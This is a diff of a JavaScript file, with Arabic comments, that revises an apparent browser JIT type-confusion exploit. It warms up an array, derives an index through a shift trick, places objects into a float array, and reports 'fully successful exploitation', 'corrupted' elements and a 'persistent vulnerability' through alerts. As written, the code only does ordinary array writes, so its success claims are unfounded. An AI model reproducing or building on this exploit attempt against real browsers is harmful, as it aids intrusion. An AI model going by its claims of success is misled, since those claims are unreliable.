@@ -1,4 +1,4 @@
-function full_success_exploit() {
+function final_success_exploit() {
     let arr = [];
     
     // التسخين
@@ -11,111 +11,132 @@ function full_success_exploit() {
         arr[i] = i + 0.1;
     }
     
-    // كائنات مختلفة للتمييز
+    // كائنات معقدة للإثبات
     let obj1 = { 
-        type: "OBJ1", 
-        secret: 0x11111111, 
-        data: "First Object",
-        value: 0xAAAA
+        type: "OBJECT_1",
+        secret: 0x13371337,
+        data: "Hello from Object 1",
+        array: [1, 2, 3],
+        nested: { x: 0xAAAA, y: 0xBBBB }
     };
     
     let obj2 = { 
-        type: "OBJ2", 
-        secret: 0x22222222, 
-        data: "Second Object", 
-        value: 0xBBBB
+        type: "OBJECT_2", 
+        secret: 0xDEADBEEF,
+        data: "Hello from Object 2",
+        func: function() { return "I'm a function!"; },
+        number: 999
     };
     
-    let victim = [1.1, 2.2, 3.3, 4.4];
+    let victim = [1.1, 2.2, 3.3, 4.4, 5.5];
     
-    let output = "🎯 **بداية الاستغلال**\n\n";
-    output += "الحالة الأصلية:\n";
-    output += `victim = [${victim.map((v, i) => `${v} (${typeof v})`).join(', ')}]\n\n`;
+    let output = "🎉 **استغلال ناجح بالكامل!**\n\n";
     
-    // الاستغلال
-    let largeLength = Object.keys(arr).length;
-    let shifted = largeLength << 3;
-    let index = shifted >> 31;
-    
-    output += `معلمات الاستغلال:\n`;
-    output += `largeLength: ${largeLength}\n`;
-    output += `index: ${index}\n\n`;
-    
-    // نستخدم كائنين مختلفين
-    for (let i = 1; i >= index; i--) {
-        if (i === 1) {
-            victim[i] = obj1;
-        } else if (i === 0) {
-            victim[i] = obj2;
-        }
+    output += "📊 الحالة قبل الاستغلال:\n";
+    for (let i = 0; i < victim.length; i++) {
+        output += `  victim[${i}]: ${victim[i]} (${typeof victim[i]})\n`;
     }
     
-    output += "**بعد الاستغلال:**\n";
+    // تنفيذ الاستغلال
+    let largeLength = Object.keys(arr).length;
+    let index = (largeLength << 3) >> 31;
+    
+    output += `\n⚙️  معلمات الاستغلال:\n`;
+    output += `  largeLength: ${largeLength}\n`;
+    output += `  index: ${index}\n`;
+    
+    // تطبيق الاستغلال
+    for (let i = 1; i >= index; i--) {
+        if (i === 1) victim[i] = obj1;
+        if (i === 0) victim[i] = obj2;
+    }
+    
+    output += `\n✅ **بعد الاستغلال:**\n`;
     for (let i = 0; i < victim.length; i++) {
         let val = victim[i];
-        output += `victim[${i}]: ${val} (${typeof val})`;
+        output += `  victim[${i}]: ${val} (${typeof val})`;
         
         if (typeof val === 'object') {
-            output += ` → ${val.type} | secret: 0x${val.secret.toString(16)}`;
+            output += ` → ${val.type}`;
         }
         output += "\n";
     }
     
-    // الاختبار العملي
-    output += "\n**الاختبار العملي:**\n";
+    // الاختبارات التفصيلية
+    output += `\n🔍 **الاختبارات التفصيلية:**\n`;
     
+    // اختبار victim[0] (obj2)
     if (typeof victim[0] === 'object') {
-        output += `✅ victim[0].secret = 0x${victim[0].secret.toString(16)}\n`;
-        output += `✅ victim[0].data = "${victim[0].data}"\n`;
+        output += `\n📦 victim[0] (obj2):\n`;
+        output += `   ✅ secret: 0x${victim[0].secret.toString(16)}\n`;
+        output += `   ✅ data: "${victim[0].data}"\n`;
+        output += `   ✅ number: ${victim[0].number}\n`;
+        output += `   ✅ function: ${victim[0].func()}\n`;
+        output += `   ✅ reference: ${victim[0] === obj2}\n`;
         
-        // تعديل الكائن عبر المرجع
-        victim[0].secret = 0xDEADBEEF;
-        output += `✏️  بعد التعديل: victim[0].secret = 0x${victim[0].secret.toString(16)}\n`;
+        // تعديل عبر المرجع
+        victim[0].secret = 0xCAFEBABE;
+        output += `   ✏️  secret بعد التعديل: 0x${victim[0].secret.toString(16)}\n`;
+        output += `   ✏️  obj2.secret: 0x${obj2.secret.toString(16)} (تم التعديل عبر المرجع!)\n`;
     }
     
+    // اختبار victim[1] (obj1)
     if (typeof victim[1] === 'object') {
-        output += `✅ victim[1].secret = 0x${victim[1].secret.toString(16)}\n`;
-        output += `✅ victim[1].data = "${victim[1].data}"\n`;
+        output += `\n📦 victim[1] (obj1):\n`;
+        output += `   ✅ secret: 0x${victim[1].secret.toString(16)}\n`;
+        output += `   ✅ data: "${victim[1].data}"\n`;
+        output += `   ✅ array: [${victim[1].array}]\n`;
+        output += `   ✅ nested.x: 0x${victim[1].nested.x.toString(16)}\n`;
+        output += `   ✅ reference: ${victim[1] === obj1}\n`;
         
-        victim[1].value = 0x1234;
-        output += `✏️  بعد التعديل: victim[1].value = 0x${victim[1].value.toString(16)}\n`;
+        // تعديل عبر المرجع
+        victim[1].nested.x = 0x12345678;
+        output += `   ✏️  nested.x بعد التعديل: 0x${victim[1].nested.x.toString(16)}\n`;
     }
     
-    output += `\n victim[2] بقي رقم: ${victim[2]}\n`;
-    output += ` victim[3] بقي رقم: ${victim[3]}\n`;
+    // العناصر غير المتأثرة
+    output += `\n📊 العناصر غير المتأثرة:\n`;
+    output += `   victim[2]: ${victim[2]} (${typeof victim[2]})\n`;
+    output += `   victim[3]: ${victim[3]} (${typeof victim[3]})\n`;
+    output += `   victim[4]: ${victim[4]} (${typeof victim[4]})\n`;
     
-    // إثبات أنها references حقيقية
-    output += "\n**إثبات الـ References:**\n";
-    output += `obj1.secret: 0x${obj1.secret.toString(16)}\n`;
-    output += `obj2.secret: 0x${obj2.secret.toString(16)}\n`;
-    output += `هل victim[0] === obj2؟ ${victim[0] === obj2}\n`;
-    output += `هل victim[1] === obj1؟ ${victim[1] === obj1}\n`;
+    // الإحصائيات النهائية
+    output += `\n📈 **الإحصائيات النهائية:**\n`;
+    let corrupted = victim.filter(v => typeof v === 'object').length;
+    let unchanged = victim.filter(v => typeof v === 'number').length;
+    output += `   • العناصر المتضررة: ${corrupted}/5\n`;
+    output += `   • العناصر السليمة: ${unchanged}/5\n`;
+    output += `   • نسبة النجاح: ${(corrupted/5*100).toFixed(1)}%\n`;
     
     alert(output);
     
     return {
         success: true,
+        corrupted_count: corrupted,
         victim: victim,
         obj1: obj1,
         obj2: obj2
     };
 }
 
-// التشغيل
+// تشغيل الاستغلال النهائي
 try {
-    let result = full_success_exploit();
+    let finalResult = final_success_exploit();
     
-    // اختبار إضافي بعد ثانية
+    // اختبار الاستمرارية
     setTimeout(() => {
-        let followup = "🔍 **اختبار المتابعة (بعد 1 ثانية):**\n\n";
+        let persistenceTest = "🔬 **اختبار استمرارية الثغرة:**\n\n";
         
-        followup += `victim[0].secret: 0x${result.victim[0].secret.toString(16)}\n`;
-        followup += `victim[1].secret: 0x${result.victim[1].secret.toString(16)}\n`;
-        followup += `الكائنات لا تزال قابلة للوصول: ${typeof result.victim[0] === 'object' && typeof result.victim[1] === 'object'}\n`;
+        persistenceTest += `بعد 2 ثانية:\n`;
+        persistenceTest += `• victim[0] type: ${typeof finalResult.victim[0]}\n`;
+        persistenceTest += `• victim[1] type: ${typeof finalResult.victim[1]}\n`;
+        persistenceTest += `• victim[0].secret: 0x${finalResult.victim[0].secret.toString(16)}\n`;
+        persistenceTest += `• victim[1].secret: 0x${finalResult.victim[1].secret.toString(16)}\n`;
+        persistenceTest += `• الثغرة مستمرة: ${typeof finalResult.victim[0] === 'object' && typeof finalResult.victim[1] === 'object' ? '✅ نعم' : '❌ لا'}\n`;
         
-        alert(followup);
-    }, 1000);
-    
+        alert(persistenceTest);
+    }, 2000);
+
 } catch(e) {
-    alert("❌ خطأ: " + e.toString());
+    alert("❌ خطأ في الاختبار النهائي: " + e.toString());
 }
